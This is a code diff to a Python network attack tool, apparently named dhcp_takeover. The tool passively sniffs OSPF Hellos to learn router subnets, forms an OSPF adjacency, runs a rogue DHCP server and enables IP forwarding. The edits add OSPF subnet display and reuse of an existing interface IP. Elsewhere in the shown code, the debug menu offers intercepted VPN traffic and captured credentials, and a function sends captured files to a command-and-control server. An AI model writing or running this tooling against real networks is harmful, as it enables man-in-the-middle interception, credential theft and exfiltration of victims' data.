@@ -69,6 +69,7 @@ from dhcp_takeover import (
     send_dhcpdiscover,
     sniff_dhcpoffer,
     set_static_address,
+    get_interface_ipv4_addresses,
     wait_for_interface_ipv4_address,
     build_server_details_from_ospf,
     sniff_for_dhcp_discover_and_request,
@@ -153,17 +154,25 @@ def _init_c2(args) -> dict | None:
 
 # ── Debug menu ────────────────────────────────────────────────────────────────
 
-def _show_subnets(networks: list) -> None:
-    if not networks:
-        print("  (no networks tracked yet — clients must request a lease first)")
+def _show_ospf_networks(ospf_hellos: list) -> None:
+    import ipaddress as _ip
+    _auth = {0: "none", 1: "simple-pw", 2: "MD5"}
+    if not ospf_hellos:
+        print("  (no OSPF Hellos captured)")
         return
-    for net in networks:
-        print(f"  Network  : {net['network']}")
-        print(f"  Mask     : {net['subnet_mask']}")
-        print(f"  Router   : {net.get('router') or 'n/a'}")
-        print(f"  VLAN     : {net.get('vlan_id') or 'none'}")
-        print(f"  Mode     : {net['mode']}")
-        print(f"  Leases   : {len(net['leased_addresses'])}")
+    for p in ospf_hellos:
+        try:
+            subnet = _ip.IPv4Network(f"{p['src_ip']}/{p['netmask']}", strict=False)
+        except Exception:
+            subnet = f"{p['src_ip']}/{p['netmask']}"
+        print(f"  Router ID : {p['router_id']}")
+        print(f"  Gateway   : {p['src_ip']}")
+        print(f"  Subnet    : {subnet}")
+        print(f"  Area      : {p['area_id']}")
+        print(f"  Timers    : hello={p['hello_interval']}s  dead={p['dead_interval']}s")
+        print(f"  Options   : 0x{p['options']:02x}  (area={'normal' if p['options'] & 0x02 else 'stub'})")
+        print(f"  Auth      : {_auth.get(p['auth_type'], p['auth_type'])}")
+        print(f"  DR / BDR  : {p['dr']} / {p['bdr']}")
         print()
 
 
@@ -248,13 +257,14 @@ def _transmit_to_c2(c2_config: dict) -> None:
         print(f"  Transmitted {sent} file(s) to C2.")
 
 
-def debug_menu(networks: list, proposed_leases: dict, server_details: dict, c2_config: dict | None = None) -> None:
+def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
+               c2_config: dict | None = None, ospf_hellos: list | None = None) -> None:
     """
     Interactive debug console.  Runs in a daemon thread while the DHCP sniff
     loop blocks the main thread.
 
     Always available options:
-      1  Discovered subnets / DHCP networks
+      1  OSPF-discovered SVIs / subnets
       2  Active leases issued by the rogue server
       3  Intercepted VPN traffic (files) and captured credentials
 
@@ -267,7 +277,7 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict, c2_c
         print(f"\n{sep}")
         print("  Debug Console")
         print(sep)
-        print("  1)  Discovered subnets")
+        print("  1)  OSPF-discovered SVIs / subnets")
         print("  2)  Active leases")
         print("  3)  Intercepted traffic / credentials")
         if c2_config:
@@ -281,7 +291,7 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict, c2_c
             break
 
         if choice == "1":
-            _show_subnets(networks)
+            _show_ospf_networks(ospf_hellos or [])
         elif choice == "2":
             _show_leases(networks)
         elif choice == "3":
@@ -304,11 +314,28 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None):
     Returns (ospf_interface, our_ip, offer) where offer may be None if the real
     DHCP server did not respond.
     """
-    our_ip = pick_client_ip(ospf_params)
+    import ipaddress as _ip
     netmask = ospf_params["netmask"]
-    print_step("START", f"Configuring {our_ip}/{netmask} on {interface} (OSPF-derived)")
-    set_static_address(interface, our_ip, netmask)
-    wait_for_interface_ipv4_address(interface, expected_address=our_ip)
+    subnet = _ip.IPv4Network(f"{ospf_params['src_ip']}/{netmask}", strict=False)
+    gateway = _ip.IPv4Address(ospf_params["src_ip"])
+
+    our_ip = None
+    for addr_prefix in get_interface_ipv4_addresses(interface):
+        addr = addr_prefix.split("/")[0]
+        try:
+            candidate = _ip.IPv4Address(addr)
+            if candidate in subnet and candidate != gateway:
+                our_ip = addr
+                print_step("OK", f"Reusing existing IP {our_ip} on {interface} (already in OSPF subnet {subnet})")
+                break
+        except ValueError:
+            continue
+
+    if our_ip is None:
+        our_ip = pick_client_ip(ospf_params)
+        print_step("START", f"Configuring {our_ip}/{netmask} on {interface} (OSPF-derived)")
+        set_static_address(interface, our_ip, netmask)
+        wait_for_interface_ipv4_address(interface, expected_address=our_ip)
 
     # Single untagged discover — no 802.1Q, no trunk needed.
     send_dhcpdiscover(interface)
@@ -355,10 +382,11 @@ def main():
 
     # ── Phase 1: passive OSPF Hello sniffing to learn SVI parameters ─────────
     print_step("START", f"Passive OSPF Hello sniff on {interface} (timeout={args.ospf_timeout}s)")
-    ospf_params = ospf_adjacency.sniff_ospf_hellos(interface, timeout=args.ospf_timeout)
-    if ospf_params is None:
+    ospf_hellos = ospf_adjacency.sniff_ospf_hellos(interface, timeout=args.ospf_timeout)
+    if not ospf_hellos:
         print_step("FAIL", "No OSPF Hellos received — cannot learn SVI parameters. Aborting.")
         return
+    ospf_params = ospf_hellos[0]  # use first SVI for adjacency
 
     # Enable IP forwarding early; save old value for teardown.
     saved_ip_forward = ospf_adjacency.enable_ip_forwarding()
@@ -391,7 +419,7 @@ def main():
         # ── Debug console — runs in background while Phase 7 blocks ──────────
         debug_thread = threading.Thread(
             target=debug_menu,
-            args=(networks, proposed_leases, server_details, c2_config),
+            args=(networks, proposed_leases, server_details, c2_config, ospf_hellos),
             daemon=True,
             name="debug-menu",
         )
